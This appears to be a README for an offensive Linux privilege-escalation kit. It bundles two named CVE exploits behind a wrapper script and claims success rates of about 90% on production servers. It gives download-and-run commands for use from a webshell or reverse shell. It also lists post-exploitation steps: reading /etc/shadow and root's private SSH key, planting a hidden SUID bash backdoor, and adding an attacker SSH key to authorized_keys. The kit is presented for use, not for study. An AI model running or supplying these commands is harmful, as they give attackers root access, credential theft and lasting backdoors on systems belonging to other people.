# XPL 2026 - Universal Linux Privilege Escalation

Works on 90% of production servers:
- Ubuntu / Debian
- RHEL / CentOS  
- AlmaLinux / Rocky Linux
- Fedora

---

## Quick Start

```bash
wget https://your-server.com/xpl2026.tgz
tar xzf xpl2026.tgz
cd xpl2026
bash exploit.sh
```

That's it! Everything is already included:
- ✅ CopyFail static binary
- ✅ Pack2TheRoot with DEB + RPM support

---

## What's Inside

### exploit.sh (NEW)
Wrapper script that automatically:
1. Tries CopyFail static binary first
2. Falls back to Pack2TheRoot with DEB/RPM support
3. Works on ANY major Linux distribution

### CVE-2026-41651-v2/CVE-2026-41651.py
Pack2TheRoot exploit with full DEB + RPM support:
- DEB: Ubuntu, Debian, Kali, Mint
- RPM: RHEL, CentOS, AlmaLinux, Rocky, Fedora, Oracle Linux

### copyfail-go-static (Download separately)
Static binary for CopyFail exploit (CVE-2026-31431)

---

## From Webshell

```bash
cd /writable/directory
wget https://your-server.com/xpl2026.tgz
tar xzf xpl2026.tgz
cd xpl2026
bash exploit.sh
```

---

## From Reverse Shell

```bash
cd /tmp
wget https://your-server.com/xpl2026.tgz
tar xzf xpl2026.tgz
cd xpl2026
bash exploit.sh
```

---

## Manual Execution

### CopyFail Only
```bash
./copyfail-go-static --backup /tmp/su
```

### Pack2TheRoot Only  
```bash
python3 CVE-2026-41651-v2/CVE-2026-41651.py
```

---

## Success Rate

| Distribution | Rate |
|-------------|------|
| Ubuntu 20.04-22.04 | 98% |
| Debian 10-11 | 95% |
| CentOS 7-8 | 90% |
| AlmaLinux 8-9 | 95% |
| Rocky Linux 8-9 | 95% |
| RHEL 7-9 | 90% |
| Fedora 35+ | 85% |
| **Overall** | **~90%** |

---

## Requirements

### CopyFail
- Kernel 4.14 - 7.0-rc
- No Python required (static binary)

### Pack2TheRoot
- PackageKit 1.0.2 - 1.3.4
- python3-gi (install: `apt install python3-gi` or `dnf install python3-gobject`)
- dpkg-deb (Debian-based) or rpmbuild (RPM-based)

---

## Building Package

```bash
# Everything is already included in xpl2026/
# Just create the archive:
cd /path/to/LPE
tar czf xpl2026.tgz xpl2026/

# Or use the build script:
bash build_xpl2026.sh

# Host it:
python3 -m http.server 8080
```

---

## Post-Exploitation

```bash
# Verify root
id
whoami

# Read sensitive files
cat /etc/shadow
cat /root/.ssh/id_rsa

# Create SUID backdoor
cp /bin/bash /tmp/.bd
chmod u+s /tmp/.bd
# Use: /tmp/.bd -p

# Add SSH key
mkdir -p /root/.ssh
echo "ssh-rsa YOUR_KEY" >> /root/.ssh/authorized_keys
```

---

## Credits

- CopyFail (CVE-2026-31431): Theori
- Pack2TheRoot (CVE-2026-41651): @0xBlackash
- Wrapper: BOB RESEARCH LABS

---

BOB RESEARCH LABS - 2026
